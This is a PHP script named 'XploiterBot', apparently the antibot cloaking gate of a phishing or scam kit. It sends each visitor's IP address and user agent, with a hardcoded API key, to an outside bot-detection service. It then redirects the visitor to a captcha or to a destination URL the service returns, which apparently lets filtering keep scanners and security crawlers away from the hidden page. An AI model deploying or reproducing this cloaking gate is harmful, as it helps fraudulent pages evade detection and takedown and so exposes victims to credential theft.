<?php
error_reporting();
session_start();

#######################################################################################################
$config_bot['domain'] = 'https://botsdetector.com/'; //don't change this section
$config_bot['captcha'] = 'https://captcha.botsdetector.com'; //don't change this section
$config_bot['api_key'] = 'edf56d27f4f4c6935dff1bfde77c729f'; //don't change this section
$config_bot['short_code'] = '786448070'; //get short code from url
#######################################################################################################


class XploiterBot
{
    function __construct($config)
    {
        $this->api_key = $config['api_key'];
        $this->domain = $config['domain'];
        $this->code = $config['short_code'];
        $this->cap = $config['captcha'];
        $this->url = '';
    }

    function get_client_ip()
    {
        if (isset($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
            $_SERVER['HTTP_CLIENT_IP'] = $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        $client = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote = $_SERVER['REMOTE_ADDR'];

        if (filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }

        return $ip;
    }

    function httpGet($url)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        return $response;
    }

    function validate()
    {
        $ip = $this->get_client_ip();
        $user_agent = $_SERVER['HTTP_USER_AGENT'];
        $respons = $this->httpGet($this->domain . '/api/blocker?ip=' . $ip . '&key=' . $this->api_key . '&ua=' . urlencode($user_agent) . '&code=' . $this->code);
        $json = json_decode($respons, true);
        $this->url = $json[0]['url'];
        if ($json[0]['status'] == 'Real') {return true; } elseif($json[0]['status'] == 'Bot') {return false;}
    }

    function checkcap(){
        $uri= $_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];
        $url = $this->domain . '/api/cap?&key=' . $this->api_key .'&code=' . $this->code;
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        $response = curl_exec($ch);
        curl_close($ch);
        if($response=='true'){
            $this->Redirect($this->cap.'/verification.php?key=' . $this->api_key .'&code=' . $this->code.'&source='.$uri);
        }else{
            if($this->validate()==true){
                $this->Redirect( $this->url);
            }else{
                      $this->Redirect($this->url);
                }
        }

    }
function Redirect($url, $permanent = false)
{
    header('Location: ' . $url, true, $permanent ? 301 : 302);exit();}

}

$xploiter_bot = new XploiterBot($config_bot);
if(isset($_GET['res'])){

 if($xploiter_bot->validate()==true){

     header('location: '.$xploiter_bot->url);
 }else{
     header('location: '.$xploiter_bot->url);
 }
}else{
    $xploiter_bot->checkcap();

};
?>